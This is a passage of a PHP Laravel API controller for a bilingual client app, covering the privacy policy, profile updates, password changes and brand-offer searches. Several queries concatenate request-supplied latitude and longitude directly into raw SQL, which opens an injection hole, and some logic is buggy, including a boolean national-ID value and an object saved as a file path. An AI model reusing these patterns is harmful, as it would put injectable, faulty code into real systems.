        $PolicyAr = $PolicyAr . "<br>كيف نحصل على بيانات عنك <br>نحن نستخدم أدوات مثل ملفات تعريف الارتباط وإشارات الويب وخدمات التحليلات وموفري الإعلانات لجمع البيانات المذكورة أعلاه. توفر لك بعض هذه الأدوات القدرة على إلغاء الاشتراك في جمع البيانات.";
        $PolicyAr = $PolicyAr . '<br>لماذا نستخدم بياناتك <br>الرد على أسئلتك ومخاوفك ؛ إرسال رسائل ومعلومات إدارية إليك ، بما في ذلك رسائل من المدربين ومساعدي التدريس ، وإشعارات حول التغييرات التي تطرأ على خدمتنا ، وتحديثات اتفاقياتنا ؛ إرسال إشعارات الدفع إلى جهازك اللاسلكي لتوفير التحديثات والرسائل الأخرى ذات الصلة (والتي يمكنك إدارتها من صفحة "الخيارات" أو "الإعدادات" لتطبيق الهاتف المحمول) ؛ ';
        $PolicyAr = $PolicyAr . '<br>اختياراتك حول استخدام بياناتك <br>لإيقاف تلقي اتصالات ترويجية منا ، يمكنك إلغاء الاشتراك باستخدام آلية إلغاء الاشتراك في الرسالة الترويجية التي تتلقاها أو عن طريق تغيير تفضيلات البريد الإلكتروني في حسابك. لاحظ أنه بغض النظر عن إعدادات تفضيلات البريد الإلكتروني الخاصة بك ، سوف نرسل لك رسائل المعاملات والعلاقة فيما يتعلق بالخدمات ، بما في ذلك التأكيدات الإدارية ، وتأكيدات الطلب ، والتحديثات المهمة حول الخدمات ، والإشعارات المتعلقة بسياساتنا. قد يسمح لك المتصفح أو الجهاز الذي تستخدمه بالتحكم في ملفات تعريف الارتباط وأنواع أخرى من تخزين البيانات المحلية. قد يسمح لك جهازك اللاسلكي أيضًا بالتحكم في ما إذا كان سيتم جمع ومشاركة الموقع أو البيانات الأخرى. يمكنك إدارة LSOs من Adobe من خلال لوحة إعدادات تخزين موقع الويب. للحصول على المعلومات والتحكم في ملفات تعريف الارتباط المستخدمة للإعلانات المخصصة من الشركات المشاركة ، راجع صفحات إلغاء الاشتراك الخاصة بالمستهلكين لمبادرة إعلانات الشبكة وتحالف الإعلان الرقمي ، أو إذا كنت مقيمًا في الاتحاد الأوروبي ، فتفضل بزيارة اختياراتك عبر الإنترنت اذا أنت. لتعطيل إعلانات Google المصوّرة أو تخصيص إعلانات شبكة Google الإعلانية ، تفضل بزيارة صفحة إعدادات إعلانات Google. لإلغاء الاشتراك في إعلانات Taboola المستهدفة ، راجع رابط إلغاء الاشتراك في سياسة ملفات تعريف الارتباط الخاصة بهم. لتحديث البيانات التي تقدمها مباشرة ، قم بتسجيل الدخول إلى حسابك وقم بتحديث حسابك في أي وقت.';
        $PolicyAr = $PolicyAr . '<br>سياستنا المتعلقة بالأطفال<br>نحن ندرك اهتمامات خصوصية الأطفال ونشجع الآباء والأوصياء على القيام بدور نشط في أنشطة واهتمامات أطفالهم عبر الإنترنت. يجب ألا يستخدم الأطفال الذين تقل أعمارهم عن 13 عامًا (أو أقل من 16 عامًا في المنطقة الاقتصادية الأوروبية) الخدمات. إذا علمنا أننا جمعنا بيانات شخصية من طفل دون تلك الأعمار ، فسنتخذ خطوات معقولة لحذفها. ';

        if ($ClientAppLanguage == "En") {
            $Policy = $PolicyEn;
        } else {
            $Policy = $PolicyAr;
        }

        $APICode = APICode::where('IDAPICode', 8)->first();
        $Response = array(
            'Success' => true,
            'ApiMsg' => __('apicodes.' . $APICode->IDApiCode),
            'ApiCode' => $APICode->IDApiCode,
            'Response' => $Policy
        );

        return $Response;
    }

    public function Terms()
    {
        return 123123123;
    }

    public function AboutUs(Request $request)
    {
        $ClientAppLanguage = LocalAppLanguage($request->ClientAppLanguage);
        $AboutUsTitle = GeneralSettings('AboutUsTitle' . $ClientAppLanguage);
        $AboutUsBody = GeneralSettings('AboutUsBody' . $ClientAppLanguage);
        $ContactLocation = GeneralSettings('ContactLocation' . $ClientAppLanguage);
        $ContactLocationLat = GeneralSettings('ContactLocationLat');
        $ContactLocationLong = GeneralSettings('ContactLocationLong');
        $ContactPhone = GeneralSettings('ContactPhone');
        $ContactEmail = GeneralSettings('ContactEmail');
        $ContactFacebook = GeneralSettings('ContactFacebook');
        $ContactInstagram = GeneralSettings('ContactInstagram');
        $ContactYouTube = GeneralSettings('ContactYouTube');
        $ContactWhatsApp = GeneralSettings('ContactWhatsApp');

        $Contact = array("AboutUsTitle" => $AboutUsTitle, "AboutUsBody" => $AboutUsBody, "ContactLocation" => $ContactLocation, "ContactLocationLat" => $ContactLocationLat, "ContactLocationLong" => $ContactLocationLong, "ContactPhone" => $ContactPhone, "ContactEmail" => $ContactEmail, "ContactFacebook" => $ContactFacebook, "ContactInstagram" => $ContactInstagram, "ContactYouTube" => $ContactYouTube, "ContactWhatsApp" => $ContactWhatsApp);
        $APICode = APICode::where('IDAPICode', 8)->first();
        $Response = array(
            'Success' => true,
            'ApiMsg' => __('apicodes.' . $APICode->IDApiCode),
            'ApiCode' => $APICode->IDApiCode,
            'Response' => $Contact
        );

        return $Response;
    }

    public function ContactUs(Request $request)
    {
        $UserName = $request->UserName;
        $Email = $request->Email;
        $Message = $request->Message;
        if (!$UserName) {
            return RespondWithBadRequest(1);
        }
        if (!$Email) {
            return RespondWithBadRequest(1);
        }
        if (!$Message) {
            return RespondWithBadRequest(1);
        }

        $ContactUs = new ContactUs;
        $ContactUs->UserName = $UserName;
        $ContactUs->Email = $Email;
        $ContactUs->Message = $Message;
        $ContactUs->ContactApp = "CLIENT";
        $ContactUs->save();

        return RespondWithSuccessRequest(25);
    }

    public function ClientDeleteProfile()
    {
        $Client = auth('client')->user();
        if (!$Client) {
            return RespondWithBadRequest(10);
        }

        $Client->ClientDeleted = 1;
        $Client->save();

        JWTAuth::invalidate(JWTAuth::getToken());
        return RespondWithSuccessRequest(8);
    }

    public function ClientProfile(Request $request)
    {
        $Client = auth('client')->user();
        if (!$Client) {
            return RespondWithBadRequest(10);
        }

        $AccessToken = $request->bearerToken();
        $ClientAppLanguage = LocalAppLanguage($Client->ClientAppLanguage);

        $PositionLanguageName = "PositionTitle" . $ClientAppLanguage;
        $CityName = "CityName" . $ClientAppLanguage;
        $AreaName = "AreaName" . $ClientAppLanguage;
        $ClientNationality = "NationalityName" . $ClientAppLanguage;
        $ClientPosition = "PositionName" . $ClientAppLanguage;
        $Area = Area::find($Client->IDArea);
        $City = City::find($Area->IDCity);
        $Nationality = Nationality::find($Client->IDNationality);
        $Position = Position::find($Client->IDPosition);
        $CityName = $City->$CityName;
        $AreaName = $Area->$AreaName;
        $ClientNationality = $Nationality->$ClientNationality;
        if ($Position) {
            $ClientPosition = $Position->$ClientPosition;
        } else {
            $ClientPosition = "";
        }
        $ClientPhone = str_replace($Client->ClientPhoneFlag, "", $Client->ClientPhone);

        $Client->ClientPicture = ($Client->ClientPicture) ? asset($Client->ClientPicture) : '';
        $Client->ClientCoverImage = ($Client->ClientCoverImage) ? asset($Client->ClientCoverImage) : '';
        $ClientPosition = ($ClientPosition) ? $ClientPosition : '';
        $ClientNationalIDImage = ClientDocument::where("IDClient", $Client->IDClient)->where("ClientDocumentType", "NATIONAL_ID")->where("ClientDocumentDeleted", 0)->first();
        $ClientContract = ClientDocument::where("IDClient", $Client->IDClient)->where("ClientDocumentType", "CONTRACT")->where("ClientDocumentDeleted", 0)->first();

        if ($ClientNationalIDImage) {
            $Client->ClientNationalIDImage = ($ClientNationalIDImage->ClientDocumentPath) ? asset($ClientNationalIDImage->ClientDocumentPath) : '';
        } else {
            $Client->ClientNationalIDImage = '';
        }

        $Client->ClientContract = '';
        if ($ClientContract) {
            $Client->ClientContract = ($ClientContract->ClientDocumentPath) ? asset($ClientContract->ClientDocumentPath) : '';
        }

        $ClientImages = ClientDocument::where("IDClient", $Client->IDClient)->where("ClientDocumentDeleted", 0)->where("ClientDocumentType", "IMAGE")->get();
        $ClientVideos = ClientDocument::where("IDClient", $Client->IDClient)->where("ClientDocumentDeleted", 0)->where("ClientDocumentType", "Video")->get();
        foreach ($ClientImages as $Image) {
            $Image->ClientDocumentPath = $Image->ClientDocumentPath ? asset($Image->ClientDocumentPath) : '';
        }


        $Position = Position::find($Client->IDPosition);
        $PositionName = "Networker";
        if ($Position) {
            $PositionName = $Position->$PositionLanguageName;
        }

        $CoForClient = GetCoForClient($Client);

        $response_code = 200;
        $APICode = APICode::where('IDAPICode', 7)->first();
        $response = array(
            'IDClient' => $Client->IDClient,
            'ClientPhone' => $ClientPhone,
            'ClientPhoneFlag' => $Client->ClientPhoneFlag,
            'ClientName' => $Client->ClientName,
            "ClientAppID" => $Client->ClientAppID,
            'Co' => $CoForClient,
            'LoginBy' => $Client->LoginBy,
            'ClientEmail' => $Client->ClientEmail,
            'ClientPicture' => $Client->ClientPicture,
            "ClientCoverImage" => $Client->ClientCoverImage,
            'CityName' => $CityName,
            'IDCity' => $City->IDCity,
            "ClientNationality" => $ClientNationality,
            "ClientPosition" => $ClientPosition,
            "AreaName" => $AreaName,
            "IDArea" => $Client->IDArea,
            'ClientStatus' => $Client->ClientStatus,
            'ClientLeftPoints' => $Client->ClientLeftPoints,
            'ClientRightPoints' => $Client->ClientRightPoints,
            'ClientLeftNumber' => $Client->ClientLeftNumber,
            'ClientRightNumber' => $Client->ClientRightNumber,
            "ClientBirthDate" => $Client->ClientBirthDate,
            "ClientNationalID" => $Client->ClientNationalID,
            "ClientPrivacy" => $Client->ClientPrivacy,
            'ClientBalance' => $Client->ClientBalance,
            "ClientGender" => $Client->ClientGender,
            "ClientNationalIDImage" => $Client->ClientNationalIDImage,
            "ClientContract" => $Client->ClientContract,
            "PositionName" => $PositionName,
            "ClientImages" => $ClientImages,
            "ClientVideos" => $ClientVideos,
            'AccessToken' => $AccessToken
        );
        $response_array = array('Success' => true, 'ApiMsg' => trans('apicodes.' . $APICode->IDApiCode), 'ApiCode' => $APICode->IDApiCode, 'Response' => $response);
        $response = Response::json($response_array, $response_code);
        return $response;
    }

    public function UpdateProfile(Request $request)
    {
        $Client = auth('client')->user();
        if (!$Client) {
            return RespondWithBadRequest(10);
        }

        $ClientName = $request->ClientName;
        $ClientEmail = $request->ClientEmail;
        $ClientPhone = $request->ClientPhone;
        $ClientPhoneFlag = $request->ClientPhoneFlag;
        $ClientGender = $request->ClientGender;
        $ClientPrivacy = $request->ClientPrivacy;
        $ClientBirthDate = $request->ClientBirthDate;
        $ClientNationalID = $request->ClientNationalID || null;
        $IDArea = $request->IDArea;
        $ClientImages = $request->ClientImages;
        $ClientVideos = $request->ClientVideos;

        $IDAPICode = 8;
        $ImageExtArray = ["jpeg", "jpg", "png", "svg"];

        if ($ClientImages) {
            foreach ($ClientImages as $Photo) {
                if (!in_array($Photo->extension(), $ImageExtArray)) {
                    return RespondWithBadRequest(15);
                }
            }
        }

        if ($ClientName) {
            $Client->ClientName = $ClientName;
        }
        if ($ClientGender) {
            $Client->ClientGender = $ClientGender;
        }
        if ($ClientBirthDate) {
            $Client->ClientBirthDate = $ClientBirthDate;
        }
        if ($ClientPrivacy == 0) {
            $Client->ClientPrivacy = 0;
        }
        if ($ClientPrivacy == 1) {
            $Client->ClientPrivacy = 1;
        }
        if ($IDArea) {
            $Area = Area::find($IDArea);
            if (!$Area) {
                return RespondWithBadRequest(1);
            }
            $Client->IDArea = $IDArea;
        }
        if ($ClientEmail) {
            $ClientRecord = Client::where('ClientEmail', $ClientEmail)->where("IDClient", "<>", $Client->IDClient)->where("ClientDeleted", 0)->first();
            if ($ClientRecord) {
                return RespondWithBadRequest(2);
            }
            $Client->ClientEmail = $ClientEmail;
        }
        if ($ClientNationalID) {
            $ClientRecord = Client::where('ClientNationalID', $ClientNationalID)->where("IDClient", "<>", $Client->IDClient)->where("ClientDeleted", 0)->first();
            if ($ClientRecord) {
                return RespondWithBadRequest(20);
            }
            $Client->ClientNationalID = $ClientNationalID;
        }
        if ($request->file('ClientPicture')) {
            if (!in_array($request->ClientPicture->extension(), $ImageExtArray)) {
                return RespondWithBadRequest(15);
            }
            if ($Client->ClientPicture) {
                $OldPhoto = substr($Client->ClientPicture, 7);
                Storage::disk('uploads')->delete($OldPhoto);
            }
            $Image = SaveImage($request->file('ClientPicture'), "clients", $Client->IDClient);
            $Client->ClientPicture = $Image;
        }
        if ($request->file('ClientCoverImage')) {
            if (!in_array($request->ClientCoverImage->extension(), $ImageExtArray)) {
                return RespondWithBadRequest(15);
            }
            if ($Client->ClientCoverImage) {
                $OldPhoto = substr($Client->ClientCoverImage, 7);
                Storage::disk('uploads')->delete($OldPhoto);
            }
            $Image = SaveImage($request->file('ClientCoverImage'), "clients", $Client->IDClient);
            $Client->ClientCoverImage = $Image;
        }

        if ($ClientPhone) {
            if (!$ClientPhoneFlag) {
                return RespondWithBadRequest(1);
            }
            $ClientRecord = Client::where('ClientPhone', $ClientPhone)->where("IDClient", "<>", $Client->IDClient)->where("ClientDeleted", 0)->first();
            if ($ClientRecord) {
                return RespondWithBadRequest(3);
            }

            $Client->ClientPhone = $ClientPhone;
            $Client->ClientPhoneFlag = $ClientPhoneFlag;
            $Client->ClientStatus = "INACTIVE";
            $Client->VerificationCode = CreateVerificationCode();
            JWTAuth::invalidate(JWTAuth::getToken());
            $IDAPICode = 18;

            $Message = "رمز التحقق: " . $Client->VerificationCode;
            $To = substr($ClientPhone, 1); //Removes + in Phone Number
            // SMSMsegat($To, $Message);
        }
        $Client->save();

        if ($request->file('ClientNationalIDImage')) {
            if (!in_array($request->ClientNationalIDImage->extension(), $ImageExtArray)) {
                return RespondWithBadRequest(15);
            }
            $ClientNationalIDImage = ClientDocument::where("IDClient", $Client->IDClient)->where("ClientDocumentType", "NATIONAL_ID")->where("ClientDocumentDeleted", 0)->first();
            $OldPhoto = substr($ClientNationalIDImage->ClientDocumentPath, 7);
            Storage::disk('uploads')->delete($OldPhoto);
            $ClientNationalIDImage->ClientDocumentDeleted = 1;
            $ClientNationalIDImage->save();

            $Image = SaveImage($request->file('ClientNationalIDImage'), "clients", $Client->IDClient);
            $ClientDocument = new ClientDocument;
            $ClientDocument->IDClient = $Client->IDClient;
            $ClientDocument->ClientDocumentPath = $ClientNationalIDImage;
            $ClientDocument->ClientDocumentType = "NATIONAL_ID";
            $ClientDocument->save();
        }

        if ($ClientImages) {
            foreach ($ClientImages as $Photo) {
                $Image = SaveImage($Photo, "clients", $Client->IDClient);
                $ClientDocument = new ClientDocument;
                $ClientDocument->IDClient = $Client->IDClient;
                $ClientDocument->ClientDocumentPath = $Image;
                $ClientDocument->ClientDocumentType = "IMAGE";
                $ClientDocument->save();
            }
        }

        if ($ClientVideos) {
            if (count($ClientVideos)) {
                foreach ($ClientVideos as $Video) {
                    if (str_contains($Video, '.be/')) {
                        $ClientVideo = explode("=", $Video)[0];
                        $ClientVideo = explode("?si=", $Video)[0];
                    } else {
                        $ClientVideo = explode("=", $Video);
                        $ClientVideo = "https://www.youtube.com/embed/" . $ClientVideo[count($ClientVideo) - 1];
                    }
                    $ClientDocument = new ClientDocument;
                    $ClientDocument->IDClient = $Client->IDClient;
                    $ClientDocument->ClientDocumentPath = $ClientVideo;
                    $ClientDocument->ClientDocumentType = "VIDEO";
                    $ClientDocument->save();
                }
            }
        }

        return RespondWithSuccessRequest($IDAPICode);
    }

    public function RemoveClientDocument($IDClientDocument)
    {
        $Client = auth('client')->user();
        if (!$Client) {
            return RespondWithBadRequest(10);
        }

        $ClientDocument = ClientDocument::where("IDClientDocument", $IDClientDocument)->where("IDClient", $Client->IDClient)->where("ClientDocumentDeleted", 0)->first();
        if (!$ClientDocument) {
            return RespondWithBadRequest(1);
        }

        if ($ClientDocument->ClientDocumentType == "IMAGE") {
            $OldDocument = substr($ClientDocument->ClientDocumentPath, 7);
            Storage::disk('uploads')->delete($OldDocument);
        }

        $ClientDocument->ClientDocumentDeleted = 1;
        $ClientDocument->save();
        return RespondWithSuccessRequest(8);
    }

    public function ChangeLanguage(Request $request)
    {
        $Client = auth('client')->user();
        if (!$Client) {
            return RespondWithBadRequest(10);
        }

        $ClientAppLanguage = $request->ClientAppLanguage;
        if (!$ClientAppLanguage) {
            return RespondWithBadRequest(1);
        }

        $Client->ClientAppLanguage = $ClientAppLanguage;
        $Client->save();

        Session::put('ClientAppLanguage', $ClientAppLanguage);
        App::setLocale($ClientAppLanguage);

        return RespondWithSuccessRequest(8);
    }

    public function UpdateSecurityCode(Request $request)
    {
        $Client = auth('client')->user();
        if (!$Client) {
            return RespondWithBadRequest(10);
        }

        $OldClientSecurityCode = $request->OldClientSecurityCode;
        $ClientSecurityCode = $request->ClientSecurityCode;
        if (!$ClientSecurityCode) {
            return RespondWithBadRequest(1);
        }
        if (strlen($ClientSecurityCode) != 4) {
            return RespondWithBadRequest(1);
        }
        if ($Client->ClientSecurityCode) {
            if (!$OldClientSecurityCode) {
                return RespondWithBadRequest(1);
            }
            if (!Hash::check($OldClientSecurityCode, $Client->ClientSecurityCode)) {
                return RespondWithBadRequest(38);
            }
        }

        $Client->ClientSecurityCode = Hash::make($ClientSecurityCode);
        $Client->save();

        return RespondWithSuccessRequest(8);
    }

    public function ChangePassword(Request $request)
    {
        $Client = auth('client')->user();
        if (!$Client) {
            return RespondWithBadRequest(10);
        }

        if ($Client->LoginBy != "MANUAL") {
            return RespondWithBadRequest(1);
        }

        $OldPassword = $request->OldPassword;
        $NewPassword = $request->NewPassword;
        $PasswordConfirmation = $request->PasswordConfirmation;

        if (!$OldPassword) {
            return RespondWithBadRequest(1);
        }
        if (!$NewPassword) {
            return RespondWithBadRequest(1);
        }
        if (!$PasswordConfirmation) {
            return RespondWithBadRequest(1);
        }

        if ($NewPassword != $PasswordConfirmation) {
            return RespondWithBadRequest(12);
        }

        $Credentials = [
            'ClientPhone' => $Client->ClientPhone,
            'ClientDeleted' => 0,
            'password' => $OldPassword
        ];

        $AccessToken = CreateToken($Credentials, 'client');
        if (!$AccessToken) {
            return RespondWithBadRequest(13);
        }

        $Client->ClientPassword = Hash::make($NewPassword);
        $Client->save();

        JWTAuth::invalidate(JWTAuth::getToken());

        $Credentials = [
            'ClientPhone' => $Client->ClientPhone,
            'ClientDeleted' => 0,
            'password' => $NewPassword
        ];

        $AccessToken = CreateToken($Credentials, 'client')['accessToken'];

        $APICode = APICode::where('IDAPICode', 8)->first();
        $response_array = array(
            'Success' => true,
            'ApiMsg' => __('apicodes.' . $APICode->IDApiCode),
            'ApiCode' => $APICode->IDApiCode,
            'Response' => $AccessToken
        );

        $response_code = 200;
        $response = Response::json($response_array, $response_code);
        return $response;
    }

    public function ClientLogout()
    {
        $Client = auth('client')->user();
        if (!$Client) {
            return RespondWithBadRequest(10);
        }
        JWTAuth::invalidate(JWTAuth::getToken());
        return RespondWithSuccessRequest(8);
    }

    public function ClientHome(Request $request)
    {
        $Client = auth('client')->user();
        $ClientLatitude = $request->ClientLatitude;
        $ClientLongitude = $request->ClientLongitude;

        $Today = new DateTime('now');
        $Today = $Today->format('Y-m-d H:i:s');

        $Advertisements = Advertisement::where("AdvertisementLocation", "HOME")->where("AdvertisementActive", 1)->where(function ($query) use ($Today) {
            $query->where('AdvertisementStartDate', "<=", $Today)->where('AdvertisementEndDate', ">=", $Today)
                ->orwhere('AdvertisementStartDate', Null);
        })->get();

        $Advertisements = AdvertisementResource::collection($Advertisements);

        $Brands = Brand::where("BrandStatus", "ACTIVE")->limit(4)->get();
        $Brands = BrandResource::collection($Brands);

        $Categories = Category::where("CategoryActive", 1)->where("CategoryType", "PROJECT")->limit(4)->get();
        $Categories = CategoryResource::collection($Categories);

        $BrandProducts = BrandProduct::leftjoin("subcategories", "subcategories.IDSubCategory", "brandproducts.IDSubCategory")->leftjoin("brands", "brands.IDBrand", "brandproducts.IDBrand");
        $BrandProducts = $BrandProducts->where("brandproducts.BrandProductStatus", "ACTIVE")->where("brands.BrandStatus", "ACTIVE")->where("brandproducts.BrandProductStartDate", "<=", $Today)->where("brandproducts.BrandProductEndDate", ">", $Today);
        $BrandProducts = $BrandProducts->select("brandproducts.IDBrandProduct", "brandproducts.IDSubCategory", "brandproducts.IDBrand", "brandproducts.BrandProductTitleEn", "brandproducts.BrandProductTitleAr", "brandproducts.BrandProductDescEn", "brandproducts.BrandProductDescAr", "brandproducts.BrandProductPrice", "brandproducts.BrandProductDiscount", "brandproducts.BrandProductDiscountType", "brandproducts.BrandProductPoints", "brandproducts.BrandProductReferralPoints", "brandproducts.BrandProductUplinePoints", "brandproducts.BrandProductStatus", "brandproducts.BrandProductStartDate", "brandproducts.BrandProductEndDate", "brandproducts.created_at", "brands.BrandNameEn", "brands.BrandNameAr", "brands.BrandLogo", "brands.BrandRating", "subcategories.IDSubCategory", "subcategories.SubCategoryNameEn", "subcategories.SubCategoryNameAr")->orderby("brandproducts.IDBrandProduct", "DESC")->limit(4)->get();
        foreach ($BrandProducts as $Product) {
            $BrandProductGallery = BrandProductGallery::where("IDBrandProduct", $Product->IDBrandProduct)->where("BrandProductDeleted", 0)->select("BrandProductPath", "BrandProductType")->get();
            if (!count($BrandProductGallery)) {
                $BrandProductGallery = BrandGallery::where("IDBrand", $Product->IDBrand)->where("BrandGalleryDeleted", 0)->select("BrandGalleryPath as BrandProductPath", "BrandGalleryType as BrandProductType")->get();
            }
            foreach ($BrandProductGallery as $Gallery) {
                if ($Gallery->BrandProductType == "IMAGE") {
                    $Gallery->BrandProductPath = ($Gallery->BrandProductPath) ? asset($Gallery->BrandProductPath) : '';
                }
            }
            $Product->BrandProductGallery = $BrandProductGallery;
            $Product->ProductBranches = ProductBranches($Product->IDBrandProduct, $Client, "PRODUCT");
        }
        $BrandProducts = BrandProductResource::collection($BrandProducts);

        $NearBrandProductsList = [];
        $NearProductsID = [];
        if ($ClientLatitude && $ClientLongitude) {
            $NearestBrandProductRadius = GeneralSettings('NearestBrandProductRadius');
            $NearestBrandProductRadius = $NearestBrandProductRadius / 1000;

            $NearBrandProducts = BrandProduct::leftjoin("subcategories", "subcategories.IDSubCategory", "brandproducts.IDSubCategory")->leftjoin("brands", "brands.IDBrand", "brandproducts.IDBrand")->leftjoin("branches", "branches.IDBrand", "brands.IDBrand");
            $NearBrandProducts = $NearBrandProducts->where("brandproducts.BrandProductStatus", "ACTIVE")->where("brands.BrandStatus", "ACTIVE")->where("brandproducts.BrandProductStartDate", "<=", $Today)->where("brandproducts.BrandProductEndDate", ">", $Today);
            $NearBrandProducts = $NearBrandProducts->orderBy('Distance')->select(DB::raw('brandproducts.IDBrandProduct,brandproducts.IDSubCategory,brandproducts.IDBrand,brandproducts.BrandProductTitleEn,brandproducts.BrandProductTitleAr,brandproducts.BrandProductDescEn,brandproducts.BrandProductDescAr,brandproducts.BrandProductPrice,brandproducts.BrandProductDiscount,brandproducts.BrandProductDiscountType,brandproducts.BrandProductPoints,brandproducts.BrandProductReferralPoints,brandproducts.BrandProductUplinePoints,brandproducts.BrandProductStatus,brandproducts.BrandProductStartDate,brandproducts.BrandProductEndDate,brandproducts.created_at,brands.BrandNameEn,brands.BrandNameAr,brands.BrandLogo,brands.BrandRating,subcategories.SubCategoryNameEn,subcategories.SubCategoryNameAr, ( 6367 * acos( cos( radians(' . $ClientLatitude . ') ) * cos( radians( branches.BranchLatitude ) ) * cos( radians( branches.BranchLongitude ) - radians(' . $ClientLongitude . ') ) + sin( radians(' . $ClientLatitude . ') ) * sin( radians( branches.BranchLatitude ) ) ) )  AS Distance '))->get();
            // $NearBrandProducts = $NearBrandProducts->groupby("brandproducts.IDBrandProduct")->orderBy('Distance')->select(DB::raw('brandproducts.IDBrandProduct,brandproducts.IDBrand,brandproducts.BrandProductTitleEn,brandproducts.BrandProductTitleAr,brandproducts.BrandProductDescEn,brandproducts.BrandProductDescAr,brandproducts.BrandProductPrice,brandproducts.BrandProductDiscount,brandproducts.BrandProductDiscountType,brandproducts.BrandProductPoints,brandproducts.BrandProductReferralPoints,brandproducts.BrandProductUplinePoints,brandproducts.BrandProductStatus,brandproducts.BrandProductStartDate,brandproducts.BrandProductEndDate,brandproducts.created_at,brands.BrandNameEn,brands.BrandNameAr,brands.BrandLogo,brands.BrandRating,subcategories.SubCategoryNameEn,subcategories.SubCategoryNameAr, ( 6367 * acos( cos( radians(' . $ClientLatitude . ') ) * cos( radians( branches.BranchLatitude ) ) * cos( radians( branches.BranchLongitude ) - radians(' . $ClientLongitude . ') ) + sin( radians(' . $ClientLatitude . ') ) * sin( radians( branches.BranchLatitude ) ) ) )  AS Distance '))->havingRaw('Distance < '.$NearestBrandProductRadius)->limit(4)->get();
            foreach ($NearBrandProducts as $Product) {
                if ($Product->Distance > $NearestBrandProductRadius || in_array($Product->IDBrandProduct, $NearProductsID)) {
                    continue;
                }
                $BrandProductGallery = BrandProductGallery::where("IDBrandProduct", $Product->IDBrandProduct)->where("BrandProductDeleted", 0)->select("BrandProductPath", "BrandProductType")->get();
                if (!count($BrandProductGallery)) {
                    $BrandProductGallery = BrandGallery::where("IDBrand", $Product->IDBrand)->where("BrandGalleryDeleted", 0)->select("BrandGalleryPath as BrandProductPath", "BrandGalleryType as BrandProductType")->get();
                }
                foreach ($BrandProductGallery as $Gallery) {
                    if ($Gallery->BrandProductType == "IMAGE") {
                        $Gallery->BrandProductPath = ($Gallery->BrandProductPath) ? asset($Gallery->BrandProductPath) : '';
                    }
                }
                $Product->BrandProductGallery = $BrandProductGallery;
                $Product->ProductBranches = ProductBranches($Product->IDBrandProduct, $Client, "PRODUCT");
                array_push($NearBrandProductsList, $Product);
                array_push($NearProductsID, $Product->IDBrandProduct);
            }
            $NearBrandProductsList = BrandProductResource::collection($NearBrandProductsList);
        }

        $Response = ["Advertisements" => $Advertisements, "Brands" => $Brands, "Categories" => $Categories, "BrandProducts" => $BrandProducts, "NearBrandProducts" => $NearBrandProductsList];

        $APICode = APICode::where('IDAPICode', 8)->first();
        $Response = array(
            'Success' => true,
            'ApiMsg' => __('apicodes.' . $APICode->IDApiCode),
            'ApiCode' => $APICode->IDApiCode,
            'Response' => $Response
        );
        return $Response;
    }

    public function Brands(Request $request)
    {
        $SearchKey = $request->SearchKey;
        $IDBrand = $request->IDBrand;
        $IDCity = $request->IDCity;
        $IDArea = $request->IDArea;
        $IDCategory = $request->IDCategory;
        $IDSubCategory = $request->IDSubCategory;
        $BrandProductDiscountType = $request->BrandProductDiscountType;
        $BrandProductPoints = $request->BrandProductPoints;
        $ClientLatitude = $request->ClientLatitude;
        $ClientLongitude = $request->ClientLongitude;
        $BrandRating = $request->BrandRating;
        $OrderBy = "IDBrandProduct";
        if ($BrandProductPoints) {
            $OrderBy = "BrandProductPoints";
        }

        $Today = new DateTime('now');
        $Today = $Today->format('Y-m-d H:i:s');

        if ($ClientLatitude && $ClientLongitude) {
            $NearestBrandProductRadius = GeneralSettings('NearestBrandProductRadius');
            $NearestBrandProductRadius = $NearestBrandProductRadius / 1000;

            $BrandProducts = BrandProduct::leftjoin("subcategories", "subcategories.IDSubCategory", "brandproducts.IDSubCategory")->leftjoin("brands", "brands.IDBrand", "brandproducts.IDBrand")->leftjoin("branches", "branches.IDBrand", "brands.IDBrand")->leftjoin("areas", "areas.IDArea", "branches.IDArea");
            $BrandProducts = $BrandProducts->where("brandproducts.BrandProductStatus", "ACTIVE")->where("brands.BrandStatus", "ACTIVE")->where("branches.BranchStatus", "ACTIVE")->where("brandproducts.BrandProductStartDate", "<=", $Today)->where("brandproducts.BrandProductEndDate", ">", $Today);
            if ($IDBrand) {
                $BrandProducts = $BrandProducts->where("brandproducts.IDBrand", $IDBrand);
            }
            if ($BrandRating) {
                $BrandProducts = $BrandProducts->where("brands.BrandRating", $BrandRating);
            }
            if ($IDCity) {
                $BrandProducts = $BrandProducts->whereIn("areas.IDCity", $IDCity);
            }
            if ($IDArea) {
                $BrandProducts = $BrandProducts->whereIn("branches.IDArea", $IDArea);
            }
            if ($IDCategory) {
                $BrandProducts = $BrandProducts->whereIn("subcategories.IDCategory", $IDCategory);
            }
            if ($IDSubCategory) {
                $BrandProducts = $BrandProducts->whereIn("brandproducts.IDSubCategory", $IDSubCategory);
            }
            if ($BrandProductDiscountType) {
                $BrandProducts = $BrandProducts->where("brandproducts.BrandProductDiscountType", $BrandProductDiscountType);
            }
            if ($SearchKey) {
                $BrandProducts = $BrandProducts->where(function ($query) use ($SearchKey) {
                    $query->where('BrandProductTitleEn', 'like', '%' . $SearchKey . '%')->orwhere('BrandProductTitleAr', 'like', '%' . $SearchKey . '%')->orwhere('BrandProductDescEn', 'like', '%' . $SearchKey . '%')->orwhere('BrandProductDescAr', 'like', '%' . $SearchKey . '%');
                });
            }
            $BrandProducts = $BrandProducts->groupby("brandproducts.IDBrandProduct")->orderBy('Distance')->orderby("brandproducts." . $OrderBy, "DESC")->select(DB::raw('brandproducts.IDBrandProduct,brandproducts.IDSubCategory,brandproducts.IDBrand,brandproducts.BrandProductTitleEn,brandproducts.BrandProductTitleAr,brandproducts.BrandProductDescEn,brandproducts.BrandProductDescAr,brandproducts.BrandProductPrice,brandproducts.BrandProductDiscount,brandproducts.BrandProductDiscountType,brandproducts.BrandProductPoints,brandproducts.BrandProductReferralPoints,brandproducts.BrandProductUplinePoints,brandproducts.BrandProductStatus,brandproducts.BrandProductStartDate,brandproducts.BrandProductEndDate,brandproducts.created_at,brands.BrandNameEn,brands.BrandNameAr,brands.BrandLogo,brands.BrandRating,subcategories.SubCategoryNameEn,subcategories.SubCategoryNameAr, ( 6367 * acos( cos( radians(' . $ClientLatitude . ') ) * cos( radians( branches.BranchLatitude ) ) * cos( radians( branches.BranchLongitude ) - radians(' . $ClientLongitude . ') ) + sin( radians(' . $ClientLatitude . ') ) * sin( radians( branches.BranchLatitude ) ) ) )  AS Distance '))->havingRaw('Distance < ' . $NearestBrandProductRadius)->get();
            foreach ($BrandProducts as $Product) {
